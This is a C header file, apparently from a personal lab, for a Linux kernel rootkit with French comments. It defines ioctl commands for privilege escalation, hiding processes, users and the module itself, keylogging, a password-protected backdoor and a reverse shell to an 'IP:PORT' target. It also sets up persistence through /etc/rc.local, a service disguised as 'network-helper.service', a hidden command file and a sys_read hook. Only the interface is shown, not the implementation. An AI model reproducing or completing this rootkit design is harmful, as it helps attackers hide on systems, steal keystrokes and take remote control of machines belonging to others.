#ifndef ROOTKIT_H
#define ROOTKIT_H

#ifdef __KERNEL__
#  include <linux/ioctl.h>
#else
#  include <sys/ioctl.h>
#endif

#ifdef __KERNEL__
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/ptrace.h>
#include <linux/string.h>
#include <linux/net.h>
#include <net/sock.h>
#include <linux/tcp.h>
#include <linux/seq_file.h>
#include <net/tcp.h>
#include <linux/socket.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/kthread.h>
#include <linux/umh.h>
#include <linux/input.h>
#include <linux/list.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/mutex.h>
#include <linux/in.h>
#endif

#define RK_MAGIC 'R'
#define MCOUNT_INSN_SIZE 5
#define NAME_MODULE "rootkit"
#define HIDDEN_SCRIPT "network-helper.service"
#define RK_MSG_MAX 256
#define BACKDOOR_PASS_MAX 32
#define KEYLOG_BUF_MAX 4096
#define RK_MAGIC_SIGNAL 63
#define MAX_HIDDEN_PIDS 16
#define HIDDEN_USER_MAX 64
#define PROTECTED_PATH_MAX 256
#define MAX_PROTECTED_FILES 8
#define MAX_READ_INTERCEPT 65536

/* chemin du fichier de persistance sur ta LFS */
#define PERSIST_FILE "/etc/rc.local"

/* Types de privilèges */
#define RK_PRIVESC_BY_CMD  1

/* chemin du fichier trigger pour le canal de comm secondaire */
#define RK_CMD_FILE "/tmp/.rk_cmd"

/* Buffer pour le canal de communication secondaire */

extern char rk_msg[RK_MSG_MAX];

/* Structure d'arguments passee a chaque commande */
struct rk_args {
    unsigned long target;
    unsigned int value;    /* parametre supplementaire selon la commande */
};

/* Definition des commandes ioctl */
#define RK_CMD_PRIVESC  _IOW (RK_MAGIC, 0, struct rk_args)
#define RK_CMD_HIDE_PID _IOW (RK_MAGIC, 1, struct rk_args)
#define RK_CMD_GETUID   _IOR (RK_MAGIC, 2, struct rk_args)
/* utilisee dans rk_ioctl() pour recevoir un message du programme compagnon */
#define RK_CMD_SET_MSG  _IOW (RK_MAGIC, 3, struct rk_args)
#define RK_CMD_OPEN_BACKDOOR _IOWR(RK_MAGIC, 4, struct rk_args)
#define RK_CMD_SET_BACKDOOR_PASS _IOWR(RK_MAGIC, 5, struct rk_args)
#define RK_CMD_HIDE_MODULE       _IOW (RK_MAGIC, 6, struct rk_args)
#define RK_CMD_SHOW_MODULE       _IOW (RK_MAGIC, 7, struct rk_args)
#define RK_CMD_GET_KEYLOG        _IOR (RK_MAGIC, 8, struct rk_args)
#define RK_CMD_TOGGLE_KEYLOG     _IOW (RK_MAGIC, 9, struct rk_args)
#define RK_CMD_UNHIDE_PID        _IOW (RK_MAGIC, 10, struct rk_args)
#define RK_CMD_HIDE_USER         _IOW (RK_MAGIC, 11, struct rk_args)
#define RK_CMD_PROTECT_FILE      _IOW (RK_MAGIC, 12, struct rk_args)
#define RK_CMD_UNPROTECT_FILE    _IOW (RK_MAGIC, 13, struct rk_args)
#define RK_CMD_REVERSE_SHELL     _IOW (RK_MAGIC, 14, struct rk_args)

/* Reverse shell argument: target holds pointer to "IP:PORT" string */
#define RK_REVSHELL_MAX 64



#ifdef __KERNEL__
#include <linux/file.h>

/* Type de la fonction originale sys_read */
typedef asmlinkage long (*orig_read_t)(const struct pt_regs *);

typedef unsigned long (*kallsyms_lookup_name_t)(const char *);


//asmlinkage long new_read(const struct pt_regs *regs);


// int install_read_hook(kallsyms_lookup_name_t lookup);

// void uninstall_read_hook(void);

#endif /* __KERNEL__ */

#endif /* ROOTKIT_H */